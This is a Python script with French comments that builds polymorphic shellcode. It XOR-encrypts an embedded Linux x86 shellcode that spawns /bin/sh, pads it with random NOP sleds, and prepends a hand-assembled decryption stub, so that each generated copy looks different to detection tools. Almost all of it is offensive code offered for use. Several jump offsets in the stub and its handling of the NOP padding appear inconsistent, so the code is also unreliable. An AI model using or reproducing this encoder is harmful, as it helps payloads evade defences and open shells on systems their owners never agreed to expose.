#Explications des étapes du script Python
#
#    Chiffrement du shellcode :
#        La fonction xor_encrypt prend le shellcode original et une clé de chiffrement aléatoire pour produire un shellcode chiffré.
#
#    Ajout de NOP sleds :
#        La fonction add_nops ajoute un nombre aléatoire d'instructions NOP (No Operation) avant et après le shellcode chiffré pour rendre chaque instance unique.
#
#    Génération du shellcode polymorphique :
#        La fonction generate_polymorphic_shellcode combine le shellcode chiffré avec une routine de déchiffrement pour produire le shellcode polymorphique final.
#        La routine de déchiffrement est préfixée au shellcode chiffré pour le déchiffrer à l'exécution.
#
#
#Exécutez le script Python pour générer le shellcode polymorphique :
#  python3 generate_shellcode.py



import random

# Fonction pour chiffrer le shellcode avec XOR
def xor_encrypt(shellcode, key):
    encrypted = bytearray()
    for byte in shellcode:
        encrypted.append(byte ^ key)
    return encrypted

# Fonction pour ajouter des NOP sleds
def add_nops(shellcode, nop_count):
    nops = bytearray([0x90] * nop_count)  # 0x90 est l'instruction NOP
    return nops + shellcode + nops

# Fonction pour générer le shellcode polymorphique
def generate_polymorphic_shellcode(shellcode):
    key = random.randint(1, 255)  # Générer une clé aléatoire entre 1 et 255
    encrypted_shellcode = xor_encrypt(shellcode, key)  # Chiffrer le shellcode
    encrypted_shellcode = add_nops(encrypted_shellcode, random.randint(0, 10))  # Ajouter des NOP sleds aléatoires

    # Routine de déchiffrement ajoutée au début du shellcode chiffré
    decryption_stub = bytearray([
        0xEB, 0x10,             # jmp short decrypt : Sauter à l'étiquette de déchiffrement
        0x5E,                   # pop esi : Récupérer l'adresse de retour dans esi
        0x31, 0xC9,             # xor ecx, ecx : Mettre à zéro le registre ecx
        0xB1, len(encrypted_shellcode),  # mov cl, len(encrypted_shellcode) : Placer la longueur du shellcode chiffré dans cl
        0x80, 0x36, key,        # xor byte [esi], key : Déchiffrer chaque octet avec la clé XOR
        0x46,                   # inc esi : Passer à l'octet suivant
        0xE2, 0xFA,             # loop short -6 : Boucler jusqu'à ce que tous les octets soient déchiffrés
        0xEB, 0x05,             # jmp short shellcode : Sauter à l'exécution du shellcode déchiffré
        0xE8, 0xEB, 0xFF, 0xFF, 0xFF  # call decrypt : Appeler l'étiquette de déchiffrement
    ])

    polymorphic_shellcode = decryption_stub + encrypted_shellcode
    return polymorphic_shellcode

# Shellcode original
original_shellcode = bytearray([
    0x31, 0xC0, 0x50, 0x68, 0x2F, 0x2F, 0x73, 0x68, 
    0x68, 0x2F, 0x62, 0x69, 0x6E, 0x89, 0xE3, 0x50,
    0x53, 0x89, 0xE1, 0xB0, 0x0B, 0xCD, 0x80
])

polymorphic_shellcode = generate_polymorphic_shellcode(original_shellcode)

print('Shellcode polymorphique:')
print(' '.join(['\\x{:02x}'.format(byte) for byte in polymorphic_shellcode]))
